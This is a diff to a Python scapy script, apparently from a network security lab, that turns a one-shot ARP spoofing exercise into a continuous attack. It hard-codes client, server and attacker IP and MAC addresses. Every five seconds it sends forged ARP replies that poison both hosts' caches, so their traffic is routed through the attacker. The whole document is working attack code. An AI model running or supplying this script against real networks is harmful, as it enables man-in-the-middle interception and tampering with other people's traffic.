@@ -1,28 +1,39 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 
 from scapy.all import *
+import time
 
-VM_CLIENT_IP = ""
-VM_CLIENT_MAC = ""
-VM_SERVER_IP = ""
-VM_SERVER_MAC = ""
-VM_ATTACKER_IP = ""
-VM_ATTACKER_MAC = ""
+CLIENT_IP = "10.0.2.4"
+CLIENT_MAC = "08:00:27:26:8a:ce"
+SERVER_IP = "10.0.2.5"
+SERVER_MAC = "08:00:27:57:7d:99"
+ATTACKER_IP = "10.0.2.6"
+ATTACKER_MAC = "08:00:27:d4:91:13"
 
-Ea = Ether()
-Ea.dst = VM_CLIENT_MAC
-Aa = ARP()
-Aa.psrc = VM_SERVER_IP
-Aa.hwsrc = VM_ATTACKER_MAC
-Aa.op = 2
-pkta = Ea/Aa
-sendp(pkta)
+# Function to send ARP poisoning packets
+def send_arp_poison():
+    # Poison client ARP cache
+    Ea = Ether()
+    Ea.dst = CLIENT_MAC
+    Aa = ARP()
+    Aa.psrc = SERVER_IP
+    Aa.hwsrc = ATTACKER_MAC
+    Aa.op = 2  # ARP response (op=2)
+    pkta = Ea / Aa
+    sendp(pkta, verbose=False)
 
-Eb = Ether()
-Eb.dst = VM_SERVER_MAC
-Ab = ARP()
-Ab.psrc = VM_CLIENT_IP
-Ab.hwsrc = VM_ATTACKER_MAC
-Ab.op = 2
-pktb = Eb/Ab
-sendp(pktb)
+    # Poison server ARP cache
+    Eb = Ether()
+    Eb.dst = SERVER_MAC
+    Ab = ARP()
+    Ab.psrc = CLIENT_IP
+    Ab.hwsrc = ATTACKER_MAC
+    Ab.op = 2  # ARP response (op=2)
+    pktb = Eb / Ab
+    sendp(pktb, verbose=False)
+
+# Loop to continuously send ARP poisoning packets every 5 seconds
+while True:
+    send_arp_poison()
+    time.sleep(5)  # Wait for 5 seconds before sending again
+
